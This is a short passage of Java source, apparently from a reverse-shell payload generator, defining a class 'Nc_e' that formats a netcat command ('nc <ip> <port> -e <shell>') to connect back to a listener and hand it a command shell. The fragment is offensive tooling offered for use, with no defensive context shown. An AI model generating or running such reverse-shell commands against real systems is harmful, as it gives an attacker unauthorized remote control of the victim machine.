...
public class Nc_e extends Reverse {

    protected String shellFormat = "";

    public Nc_e(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("nc %s %s -e %s", this.getLocalIP(), this.getLocalPort(), this.getShell());
    }
